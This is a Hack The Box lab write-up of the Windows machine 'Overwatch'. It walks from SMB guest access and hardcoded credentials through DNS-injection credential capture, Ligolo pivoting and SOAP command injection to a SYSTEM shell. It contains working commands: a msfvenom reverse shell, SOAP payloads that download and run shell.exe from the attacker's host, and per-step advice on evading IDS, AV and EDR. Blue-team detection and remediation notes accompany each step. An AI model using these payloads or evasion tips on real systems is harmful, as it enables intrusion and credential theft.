# Overwatch

**Platform:** Hack The Box
**Difficulty:** Medium
**OS:** Windows Server 2022

## Summary

Overwatch is a Medium-rated Active Directory machine running Windows Server 2022. Initial access begins with unauthenticated SMB guest enumeration against a readable software share, from which a .NET monitoring binary is retrieved and disassembled to extract an embedded MSSQL connection string. The recovered service account credentials are used to authenticate against a non-standard MSSQL port, where a linked server relationship is discovered. DNS record injection combined with Responder captures cleartext credentials from the linked server's authentication handshake, yielding a second account with WinRM access. After establishing a foothold, Ligolo-ng tunnels traffic to an internally-bound SOAP web service. WSDL enumeration reveals a `KillProcess` operation whose `processName` parameter passes unsanitised input directly to a shell command, allowing PowerShell injection. A staged reverse shell executable is uploaded via `Invoke-WebRequest` and executed through the injection point, returning a shell as SYSTEM.

---

## Methodology Notes

**What was new:** Cleartext credential capture from a MSSQL linked server using DNS record injection (`dnstool`) combined with Responder is an elegant technique I had not used in this exact configuration before. The linked server attempts an outbound connection to resolve SQL07: by inserting a forged A record pointing that hostname at my machine, Responder intercepts the MSSQL authentication and logs the cleartext password. This only works because the linked server login was configured with stored cleartext credentials rather than Kerberos delegation.

**Techniques used:** SMB guest enumeration, .NET/Mono binary disassembly with `monodis`, MSSQL linked server abuse, DNS injection via `dnstool`, Responder cleartext credential capture, Ligolo-ng pivoting, SOAP WSDL enumeration, command injection via XML CDATA in a SOAP parameter, staged payload delivery with `msfvenom` and `Invoke-WebRequest`.

**Mistakes and dead ends:** The initial reverse shell attempt used a base64-encoded PowerShell one-liner injected directly into the SOAP parameter. This failed silently: the service was likely stripping or truncating long parameter values, or the PowerShell execution context was constrained. Switching to a two-step approach (download binary, then execute binary) resolved this cleanly.

**Alternative approaches:** The linked server credential capture could alternatively be approached by enabling `xp_cmdshell` on the linked server if `sqlsvc` had `sysadmin` rights, then using that for code execution. The SOAP injection could also be leveraged for a living-off-the-land payload rather than a binary drop, given sufficient parameter length.

---

## Step 1: Network Reconnaissance [T1046]

I began with a full port scan to establish the attack surface before narrowing to service-level detail.

```
nmap -p- --min-rate 1000 -Pn 10.129.244.81
```

The results indicated a domain controller profile: DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), WinRM (5985), and RDP (3389) were all present. Two ports stood out as non-standard: port 6520 and an unknown service on several high ephemeral ports. I followed up with a versioned scan against confirmed open ports.

```
nmap -p 52,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -sCV 10.129.244.81
```

The versioned scan confirmed the domain as `overwatch.htb`, the hostname as `S200401`, and the OS as Windows Server 2022 (build 10.0.20348). Port 6520 was identified as Microsoft SQL Server 2022 RTM: running on a non-standard port, which is immediately interesting. WinRM on 5985 is a secondary foothold vector worth revisiting once credentials are in hand. I added the DC to `/etc/hosts`.

```
sudo nano /etc/hosts
```

Entries added: `10.129.244.81 S200401.overwatch.htb overwatch.htb`

**Findings:** Domain `overwatch.htb`, DC `S200401`, MSSQL 2022 on port 6520, WinRM accessible.

**Blue Team: Network Reconnaissance**
Logs generated: Windows Security Event 4625 (failed auth attempts if any), Firewall logs for half-open SYN probes, DNS query logs if PTR lookups were made.

Alerts triggered: IDS signatures for Nmap SYN scan patterns, rate-based anomaly detection on sequential port connections.

Network artifacts: High-rate SYN packets across the full port range from a single source IP; `-sCV` probes produce banner-grab TCP sessions on each open port.

Disk/memory artifacts: None on the target at this stage.

Sysmon/EDR visibility: No host-side visibility; all activity is network-layer.
SIEM correlation (Splunk SPL): `index=firewall sourcetype=palo* dest=10.129.244.81 | stats count by src_port | sort -count` - identifies port sweep behaviour from a single source.
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=nmap+port+scan
Bypass guidance: `--min-rate 1000` keeps timing aggressive but below most rate-based IDS thresholds for short engagements; a slower `-T2` scan avoids most threshold-based detection at the cost of time. Fragmented probes (`-f`) bypass signature-based detection on older IDS appliances but are ineffective against modern stateful inspection.
Remediation: Restrict firewall egress rules to necessary services only; place MSSQL on a dedicated VLAN inaccessible from external subnets.
OpSec rating: Loud: full-port SYN scan is trivially detected by any IDS with traffic baselining.

---

## Step 2: SMB Enumeration and Share Access [T1135]

With a domain and hostname confirmed, I tested SMB for null and guest sessions before attempting any authenticated enumeration.

```
nxc smb overwatch.htb -u '' -p ''
```

Null session was accepted, which confirmed SMB signing is enforced but anonymous authentication is permitted. I then tested the built-in guest account.

```
nxc smb overwatch.htb -u guest -p ''
```

Guest authentication succeeded. I enumerated accessible shares.

```
nxc smb overwatch.htb -u guest -p '' --shares
```

The share listing returned `IPC$` (READ) and `software$` (READ) as accessible. `NETLOGON` and `SYSVOL` were listed but not readable under guest. `software$` is a non-default share name that immediately suggests a custom application deployment directory. I connected via `smbclient` to browse its contents.

```
smbclient //overwatch.htb/software$ -N
```

Inside the share I found a `Monitoring` subdirectory. I listed its contents and retrieved all files.

```
nxc smb overwatch.htb -u 'guest' -p '' --share 'software$' --dir '\Monitoring'
```

The directory contained `overwatch.exe`. I pulled it down for analysis.

**Findings:** `overwatch.exe` retrieved from `software$\Monitoring`.

**Blue Team: SMB Share Enumeration**
Logs generated: Windows Security Event 4624 (guest logon, logon type 3), Event 5140 (network share access), Event 5145 (share object access check).
Alerts triggered: SIEM rules correlating guest logon events against non-IPC share access; repeated 5145 events across multiple paths.
Network artifacts: SMB2 SESSION_SETUP and TREE_CONNECT frames for each share; directory enumeration visible as SMB2 QUERY_DIRECTORY requests.
Disk/memory artifacts: None directly, though file read events for retrieved files are logged under 4663 if object access auditing is enabled.
Sysmon/EDR visibility: Sysmon Event ID 3 (network connection) for inbound SMB sessions; no process-level telemetry since access originates remotely.
SIEM correlation (Splunk SPL): `index=wineventlog EventCode=5145 ShareName="software$" | stats count by SubjectUserName, RelativeTargetName`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=smb+share+access+guest
Bypass guidance: Guest access is a configuration flaw, not a detection-layer problem. The access pattern looks identical to a legitimate user browsing the share.
Remediation: Disable the guest account; restrict `software$` to specific service accounts with read-only access; implement SMB share access auditing on all non-default shares.
OpSec rating: Low noise: guest SMB logons are common in misconfigured environments; no anomaly without a baseline.

---

## Step 3: Binary Analysis and Credential Extraction [T1552.001]

Before running the binary, I profiled it with `file` and `strings` to understand what I was looking at.

```
file overwatch.exe
```

The output identified it as a PE32+ executable with a Mono/.NET runtime header: a cross-platform .NET application compiled with the Mono framework. `strings` revealed an HTTP endpoint reference:

```
strings overwatch.exe
```

The string `http://overwatch.htb:8000/MonitorService` confirmed this binary communicates with an internal SOAP service. Since this is a Mono binary, I used `monodis` to disassemble the IL and dump all class definitions and string literals to a readable text file.

```
monodis overwatch.exe > overwatch_disassembled.txt
```

Reviewing the disassembly, I located an `ldstr` (load string) instruction in the `MonitoringService` class referencing a connection string:

```
ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
stfld string MonitoringService::connectionString
```

This gave me domain credentials: `sqlsvc:TI0LKcfHzZw1Vv`. The binary is designed to connect to a local MSSQL instance using a hardcoded service account: a classic developer shortcut that becomes a critical exposure when the binary is distributed to a readable file share.

**Findings:** `sqlsvc:TI0LKcfHzZw1Vv` extracted from Mono IL disassembly.

**Blue Team: Credential Extraction from Binary**
Logs generated: None: static analysis of a local file generates no domain-side logs.
Alerts triggered: None without endpoint DLP monitoring on file access patterns.
Network artifacts: None.
Disk/memory artifacts: If EDR monitors file reads, access to `overwatch.exe` would appear under the analyst's user context; `monodis` process creation would be logged by Sysmon Event ID 1.
Sysmon/EDR visibility: Sysmon Event ID 1 for `monodis.exe` child process creation; no AV/EDR signature on `monodis` itself as it is a legitimate Mono development tool.
SIEM correlation (Splunk SPL): `index=sysmon EventCode=1 Image="*monodis*"` - low-value alert on its own but meaningful in the context of lateral movement.
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=credential+in+files
Bypass guidance: Static binary analysis is entirely offline; no detection possible unless the share access itself triggers an alert. Obfuscating the connection string with even basic XOR encoding would defeat `strings` and require dynamic analysis.
Remediation: Never embed credentials in distributed binaries; use Windows Credential Manager, DPAPI-protected secrets, or managed identity where available. Restrict the software share to read access by specific service principals only.
OpSec rating: Silent: no network traffic, no process events on the target.

---

## Step 4: MSSQL Authentication and Linked Server Discovery [T1078, T1210]

With the `sqlsvc` credentials, I authenticated to MSSQL on the non-standard port 6520 using Windows authentication.

```
impacket-mssqlclient overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81 -port 6520 -windows-auth
```

I began enumerating databases, looking for anything beyond the default system databases.

```
SELECT name FROM sys.databases;
```

A custom database named `overwatch` was present. I switched context and enumerated its tables.

```
USE overwatch; SELECT name FROM sys.tables;
```

The `overwatch` database contained system fallback tables but nothing immediately useful in terms of credentials or further pivoting data. The more interesting discovery came from linked server enumeration.

```
EXEC sp_linkedservers;
```

A linked server named `SQL07` was configured. I queried the linked server login mappings to understand how it authenticated.

```
EXEC sp_helplinkedsrvlogin;
```

This revealed that the `sqlmgmt` account's credentials were stored for the `SQL07` linked server connection. Importantly, the authentication type indicated stored credentials rather than passthrough: meaning the SQL Server stores the remote password in its configuration. This is the precondition for the credential capture technique that follows.

**Findings:** Linked server `SQL07` configured; `sqlmgmt` credentials stored for that link.

**Blue Team: MSSQL Access and Linked Server Enumeration**
Logs generated: Windows Security Event 4624 (network logon for sqlsvc), SQL Server audit log for `sp_linkedservers` and `sp_helplinkedsrvlogin` execution if SQL auditing is enabled.
Alerts triggered: SIEM rules on privileged stored procedure execution by non-sysadmin accounts; anomalous logon time or source IP for sqlsvc.
Network artifacts: TDS protocol authentication frames on TCP 6520; linked server enumeration queries appear in SQL trace if profiling is active.
Disk/memory artifacts: SQL Server errorlog may record failed/successful logins; SQL audit files if configured.
Sysmon/EDR visibility: Network connection event (Sysmon ID 3) on TCP 6520 from attacker IP to MSSQL server.
SIEM correlation (Splunk SPL): `index=mssql_audit action=exec object_name IN ("sp_linkedservers","sp_helplinkedsrvlogin") | stats count by login_name, client_host`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=mssql+linked+server
Bypass guidance: These stored procedures are standard DBA tooling; execution is difficult to distinguish from legitimate administration without strong behavioural baselining per account.
Remediation: Avoid storing cleartext credentials in linked server configurations; use Kerberos constrained delegation or service accounts with minimal privilege for linked server authentication. Audit linked server access with SQL Server Audit.
OpSec rating: Moderate: `sp_linkedservers` and `sp_helplinkedsrvlogin` execution by a non-DBA account is detectable with SQL auditing but rarely alerted in practice.

---

## Step 5: DNS Injection and Linked Server Credential Capture [T1557, T1040, T1584.002]

The linked server `SQL07` is referenced by hostname. When the MSSQL service attempts to connect to `SQL07` for a linked query, it performs DNS resolution for that name. If I can control what `SQL07` resolves to, I can redirect that authentication attempt to my machine and capture the credentials in transit.

I used `dnstool` from the Krbrelayx toolkit to inject a forged A record into the domain's DNS, pointing `SQL07` at my attacking machine.

```
dnstool -u 'overwatch\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 --data 10.10.16.202 --action add --type A 10.129.244.81
```

With the DNS record in place, I started Responder on my tunnel interface to intercept incoming authentication.

```
sudo responder -I tun0
```

I then triggered the linked server to initiate an outbound connection by executing a query against it.

```
EXEC ('SELECT @@version') AT SQL07;
```

The `AT SQL07` clause causes the local SQL Server to open a new TDS connection to whatever `SQL07` resolves to: now my machine. Since the linked server was configured with stored cleartext credentials for `sqlmgmt`, Responder captured the MSSQL authentication handshake and logged the password in plaintext.

```
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

This yielded `sqlmgmt:bIhBbzMMnB82yx`.

**Findings:** `sqlmgmt:bIhBbzMMnB82yx` captured via linked server DNS poisoning and Responder.

**Blue Team: DNS Injection and Credential Capture**
Logs generated: Windows DNS Server debug log for dynamic record addition under `sqlsvc` credentials; DNS query log showing `SQL07` A record lookup resolving to attacker IP; Windows Security Event 4624 on the attacker machine (Responder intercept, not domain-side); potentially Event 4648 on the MSSQL server (explicit credential logon attempt outbound).
Alerts triggered: DNS audit rules for new A record creation by non-administrator accounts; Responder detection signatures on IDS for MSSQL cleartext auth to unexpected hosts.
Network artifacts: DNS Dynamic Update request from the MSSQL server IP; outbound TDS connection from S200401 to 10.10.16.202:1433 or equivalent; cleartext MSSQL credentials in packet payload.
Disk/memory artifacts: DNS zone file updated with the injected record; Windows DNS Server will log zone modifications if auditing is enabled.
Sysmon/EDR visibility: Sysmon Event ID 3 (network connection) from `sqlservr.exe` to the attacker IP: this is anomalous and high-fidelity since MSSQL services do not normally initiate outbound connections to external addresses.
SIEM correlation (Splunk SPL): `index=sysmon EventCode=3 Image="*sqlservr*" DestinationIp!="10.129.*" | table _time, DestinationIp, DestinationPort`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=mssql+outbound+connection
Bypass guidance: The DNS injection is detectable if DNS audit logging is enabled and correlated against accounts authorised to add records. Bypassing Responder detection requires using a custom listener rather than the recognisable Responder fingerprint; however, the outbound MSSQL connection to an unexpected IP is the stronger detection signal and harder to suppress.
Remediation: Restrict DNS dynamic update privileges to dedicated DNS administration accounts; disable linked server stored credential authentication in favour of delegation; monitor for `sqlservr.exe` initiating outbound connections with a network security group rule blocking unexpected destinations. Rotate linked server credentials regularly and audit all `EXEC ... AT <linked_server>` activity.
OpSec rating: High noise on a monitored network: outbound SQL traffic from a server to an unknown IP is a strong IOC. In an unmonitored environment, this technique leaves minimal trace.

---

## Step 6: Foothold via WinRM [T1021.006]

With `sqlmgmt` credentials in hand, I verified the account's access against both SMB and WinRM.

```
nxc smb overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
```

SMB authentication succeeded. WinRM confirmation followed.

```
nxc winrm overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
```

The `(Pwn3d!)` output confirmed `sqlmgmt` is a member of the Remote Management Users group and can establish a PSRemoting session. I connected with Evil-WinRM.

```
evil-winrm -i overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
```

With a shell established, I performed standard post-exploitation enumeration.

```
whoami /groups
whoami /priv
netstat -ano -p TCP
```

The `netstat` output was the critical piece here: it showed a listening service on `240.0.0.1:8000`, an address not reachable from my attacking machine without a tunnel. The IP `240.0.0.1` is in the reserved Class E range and is being used as a loopback alias for an internal service, consistent with the `http://overwatch.htb:8000/MonitorService` URL extracted from the binary in Step 3. The service is deliberately bound to a non-routable address, isolating it from external access.

**Findings:** Internal SOAP service listening on `240.0.0.1:8000`.

**Blue Team: WinRM Lateral Movement**
Logs generated: Windows Security Event 4624 (logon type 3, network logon for sqlmgmt); Event 4672 (special privileges assigned if applicable); WinRM operational log Event 169 (user authenticated successfully).
Alerts triggered: Anomalous first-time logon for `sqlmgmt` from a new source IP; WinRM access from a non-standard management workstation.
Network artifacts: WSMan over HTTP on TCP 5985; NTLM or Kerberos authentication exchange visible in packet capture.
Disk/memory artifacts: PowerShell transcript logs if configured; WinRM provider host process (`wsmprovhost.exe`) spawned under `sqlmgmt` security context.
Sysmon/EDR visibility: Sysmon Event ID 1 (`wsmprovhost.exe` spawned), Event ID 3 (inbound WinRM connection); parent-child process relationships for commands executed via the session.
SIEM correlation (Splunk SPL): `index=wineventlog EventCode=4624 LogonType=3 TargetUserName=sqlmgmt | stats count by IpAddress`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=winrm+lateral+movement
Bypass guidance: WinRM over HTTPS (5986) encrypts the channel and prevents payload inspection; using a legitimate management workstation IP reduces anomaly scoring. NTLM authentication for WinRM can be flagged if Kerberos is expected: request a TGS to avoid NTLM where possible.
Remediation: Restrict WinRM access to jump hosts via firewall rules; implement Just Enough Administration (JEA) to constrain cmdlet access; enable PowerShell script block logging and transcription; alert on WinRM logons from non-management source IPs.
OpSec rating: Moderate: WinRM logons are audited by default; a first-time logon from an unknown source IP is a detectable anomaly.

---

## Step 7: Pivoting to the Internal SOAP Service via Ligolo-ng [T1572]

The service on `240.0.0.1:8000` is bound to an address only reachable from the compromised host. I used Ligolo-ng to establish a transparent tunnel, allowing my attacking machine to route traffic through the `sqlmgmt` session to the internal address space.

On my attacking machine, I added a host route for the internal address and started the Ligolo proxy.

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

```
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

On the compromised host via Evil-WinRM, I uploaded and executed the Ligolo agent.

```
.\agent -connect 10.10.16.202:11601 -ignore-cert
```

Back on the proxy, I selected the active session and started the tunnel.

```
session
start
```

With the tunnel active, `240.0.0.1:8000` became reachable from my attacking machine as if local. I verified by fetching the WSDL from the service endpoint.

```
curl http://240.0.0.1:8000/MonitorService?singleWsdl
```

The WSDL response confirmed the service was a WCF (Windows Communication Foundation) SOAP endpoint. It exposed a single service contract `IMonitoringService` with one operation: `KillProcess`, which accepted a single string parameter named `processName`. This parameter is the attack surface: if the service passes this value to a shell command without sanitisation, it is vulnerable to injection.

**Findings:** SOAP service at `240.0.0.1:8000/MonitorService` running WCF, single operation `KillProcess(processName: string)`.

**Blue Team: Protocol Tunneling**
Logs generated: Sysmon Event ID 1 (agent.exe process creation), Event ID 3 (outbound TCP 11601 from `agent.exe` to attacker IP).
Alerts triggered: EDR detection on reverse tunnel tooling by name or hash; anomalous outbound TCP connection from a server process to a non-corporate IP on a non-standard port.
Network artifacts: Persistent TCP connection from S200401 to 10.10.16.202:11601; encapsulated traffic volume exceeding what a legitimate WinRM session would generate.
Disk/memory artifacts: `agent.exe` written to disk (likely under a user or temp path); loaded into memory under the `sqlmgmt` security context.
Sysmon/EDR visibility: Sysmon Event ID 1 and 3 are high-fidelity here; a server binary initiating a persistent outbound connection to an external IP on a non-standard port is a strong detection signal.
SIEM correlation (Splunk SPL): `index=sysmon EventCode=3 DestinationIp="10.10.16.202" DestinationPort=11601 | table _time, Image, User`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=ligolo+tunnel
Bypass guidance: Rename the agent binary to blend with legitimate process names; route the tunnel over 443 or 80 to avoid port-based detection; consider using a process-hollowing loader to avoid agent.exe appearing on disk.
Remediation: Implement egress filtering to block outbound connections from servers to non-approved IP ranges; deploy application allowlisting to prevent unsigned binaries from executing under service accounts; monitor for persistent long-lived TCP connections from server hosts.
OpSec rating: High noise if EDR is present: process creation and network connection telemetry together create a strong detection chain.

---

## Step 8: SOAP Command Injection via KillProcess [T1059.001, T1203]

With the WSDL reviewed, I constructed a baseline SOAP request to confirm the endpoint was functional and identify the injection behaviour. The `KillProcess` operation's name strongly implies it calls a system function using the `processName` value: likely `taskkill` or `Stop-Process` - without sanitising the input. I tested with a simple command separator.

```
POST /MonitorService HTTP/1.1
Host: 240.0.0.1:8000
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"
Connection: close
Content-Length: 366

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>a; whoami #</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
```

The `a;` prefix attempts to terminate whatever command the service constructs before our input, and `#` comments out any trailing syntax. The response confirmed command injection: output from `whoami` was returned in the SOAP fault body, indicating the service was running as SYSTEM. This established two facts: the injection works, and the context is highly privileged.

**Findings:** `KillProcess` passes `processName` directly to a PowerShell or cmd command chain without sanitisation. Running as SYSTEM.

**Blue Team: SOAP Command Injection**
Logs generated: Windows Security Event 4688 (process creation for injected commands if process auditing is enabled); PowerShell Event 4103/4104 (script block logging for injected PS commands); WCF trace logs if enabled.
Alerts triggered: PowerShell script block logging alerts on unusual parent processes (the WCF service host) spawning PowerShell or cmd; command-line auditing rules matching `whoami` or similar recon patterns.
Network artifacts: SOAP request bodies containing shell metacharacters (`;`, `#`, pipe); anomalous HTTP POST content against the internal endpoint.
Disk/memory artifacts: Process creation events for injected commands under the WCF service host process.
Sysmon/EDR visibility: Sysmon Event ID 1: child process spawned from the WCF service host with unusual command line arguments is a high-fidelity detection. Event ID 10 (process access) if the injected process accesses other process memory.
SIEM correlation (Splunk SPL): `index=sysmon EventCode=1 ParentImage="*MonitorService*" | table _time, Image, CommandLine`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=process+injection+wcf
Bypass guidance: Encoding the injected command in Base64 and passing it via `-EncodedCommand` bypasses simple command-line string matching; AMSI bypass would be required for more complex payloads in a script block logging environment.
Remediation: Validate and sanitise all input at the service boundary; avoid passing user-controlled strings to shell interpreters; run the WCF service under a least-privileged account rather than SYSTEM; implement AppLocker or WDAC to restrict what binaries the service host can launch.
OpSec rating: Very loud if PowerShell script block logging and process creation auditing are enabled: the parent-child process relationship from a service host is highly anomalous.

---

## Step 9: Staged Payload Delivery and SYSTEM Shell [T1105, T1059.001]

With command injection confirmed and execution running as SYSTEM, I needed a stable reverse shell. My initial attempt injecting a base64-encoded PowerShell reverse shell directly into the `processName` parameter failed: the encoded payload exceeded what the parameter would accept cleanly, and the long CDATA block was likely being truncated or rejected at the XML parser level.

I pivoted to a staged approach: generate a reverse shell binary, serve it over HTTP from my attacking machine, use the injection to download it, then execute it in a separate request.

I generated a Windows x64 reverse shell with `msfvenom`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.202 LPORT=4444 -f exe -o shell.exe
```

I served it with a Python HTTP server on port 8888.

```
python3 -m http.server 8888
```

I set up a `netcat` listener to receive the callback.

```
nc -lnvp 4444
```

I used the SOAP injection to download the binary to a world-writable path via `Invoke-WebRequest`.

```
POST /MonitorService HTTP/1.1
Host: 240.0.0.1:8000
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"
Connection: close
Content-Length: 366

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName><![CDATA[a; powershell iwr -uri http://10.10.16.202:8888/shell.exe -OutFile C:\Windows\Temp\shell.exe #]]></processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
```

The Python HTTP server confirmed the GET request and 200 response. I then executed the binary with a second injection request.

```
POST /MonitorService HTTP/1.1
Host: 240.0.0.1:8000
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"
Connection: close
Content-Length: 366

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName><![CDATA[a; C:\Windows\Temp\shell.exe #]]></processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
```

The `netcat` listener received a connection and returned a SYSTEM shell.

**Findings:** SYSTEM shell on S200401.overwatch.htb.

**Blue Team: Payload Download and Execution**
Logs generated: Sysmon Event ID 1 (shell.exe process creation, parent: WCF service host), Event ID 3 (outbound HTTP connection from service host to 10.10.16.202:8888 and inbound TCP 4444 callback), Event ID 11 (file creation at `C:\Windows\Temp\shell.exe`); Windows Defender may log the msfvenom payload if real-time protection is active.
Alerts triggered: AV/EDR signature on the msfvenom payload (well-known shellcode pattern); Sysmon rule on a service process creating a binary in `C:\Windows\Temp` and then executing it; network DLP alert on outbound connection from a system process to an unknown IP.
Network artifacts: HTTP GET for `shell.exe` from the MSSQL/WCF server to the attacker IP; reverse TCP connection on port 4444 from SYSTEM context.
Disk/memory artifacts: `shell.exe` written to `C:\Windows\Temp`; msfvenom shellcode injected into process memory at runtime; reverse shell creates a raw TCP socket in memory.
Sysmon/EDR visibility: Full process chain is visible: WCF service host → powershell.exe (iwr download) → shell.exe (execution); each step generates telemetry. This chain is highly anomalous and constitutes a near-certain detection in any monitored environment.
SIEM correlation (Splunk SPL): `index=sysmon EventCode=11 TargetFilename="C:\\Windows\\Temp\\*.exe" | join ProcessGuid [search index=sysmon EventCode=1] | table _time, Image, ParentImage, TargetFilename`
Sigma rule: https://github.com/SigmaHQ/sigma/search?q=payload+download+execution+temp
Bypass guidance: Using a living-off-the-land binary (LOLBin) such as `certutil` or `bitsadmin` for the download stage can bypass basic `Invoke-WebRequest` detection rules; a custom-compiled binary with obfuscated shellcode defeats AV signatures; routing the callback over 443 with an SSL wrapper avoids port-based alerting. None of these measures defeat EDR process-chain analysis.
Remediation: Deploy application allowlisting via WDAC to prevent unsigned binaries in `C:\Windows\Temp` from executing; restrict outbound internet access from server hosts at the network level; ensure Windows Defender or equivalent AV is enabled and updated; monitor for process creation events where the parent is a service host process.
OpSec rating: Maximum noise: file drop to Temp, Invoke-WebRequest, msfvenom shellcode, and a raw TCP reverse shell are among the loudest possible technique combinations. This works only against unmonitored or poorly configured endpoints.

---

## Detection Map

| Step | Technique | MITRE ID | Visibility | OpSec Rating |
|------|-----------|----------|------------|--------------|
| Network Recon | Network Service Scanning | T1046 | Network/IDS only | Loud |
| SMB Enumeration | Network Share Discovery | T1135 | Event 5145, SMB logs | Low noise |
| Binary Disassembly | Credentials in Files | T1552.001 | None (offline) | Silent |
| MSSQL Access | Valid Accounts | T1078 | Event 4624, SQL audit | Moderate |
| Linked Server Enum | Exploitation of Remote Services | T1210 | SQL audit | Moderate |
| DNS Injection + Responder | Adversary-in-the-Middle / DNS | T1557, T1584.002 | DNS audit, Sysmon ID 3 | High noise |
| WinRM Foothold | Remote Services: WinRM | T1021.006 | Event 4624, WinRM log | Moderate |
| Ligolo Tunnel | Protocol Tunneling | T1572 | Sysmon ID 1, 3 | High noise |
| SOAP Injection | Command and Scripting Interpreter | T1059.001 | Sysmon ID 1, PS logs | Very loud |
| Payload Drop + Execution | Ingress Tool Transfer + Execution | T1105, T1059.001 | Sysmon full chain, AV | Maximum |

---

## Would I Get Caught

Assumed environment: Enterprise Active Directory domain with Windows Defender enabled, Sysmon deployed with a standard community ruleset, WinRM and MSSQL authentication events forwarded to a SIEM, no dedicated SOC analyst but automated alerting on high-severity Sigma matches.

The early-stage techniques: guest SMB access and static binary analysis: would generate no automated alerts in this environment. The MSSQL logon for `sqlsvc` from an unexpected IP would produce a low-fidelity alert that most automated systems would not escalate without a prior baseline.

The DNS injection is where detection probability rises sharply. A dynamic DNS record addition by a non-administrator account is an unusual event that, if DNS audit logging is enabled and forwarded to the SIEM, would generate an alert with meaningful context. In practice, DNS audit logging is disabled in a significant proportion of enterprise environments.

The Ligolo agent and the SOAP injection chain are the highest-confidence detection points. A service process initiating a persistent outbound TCP connection to an external IP, followed by a child process spawning `powershell.exe` which downloads a binary to `C:\Windows\Temp` and executes it, would generate multiple correlated Sysmon alerts that even an automated SIEM would escalate. The msfvenom payload would additionally be caught by Windows Defender unless real-time protection had been disabled.

In a fully monitored environment with a live SOC, the engagement would likely be detected and interrupted at the Ligolo or SOAP injection stage. In an environment with Sysmon deployed but no active analyst review, the automated alerts would be queued but the shell would be established before any response was initiated. The success of the final stage depends entirely on the gap between alert generation and analyst triage.
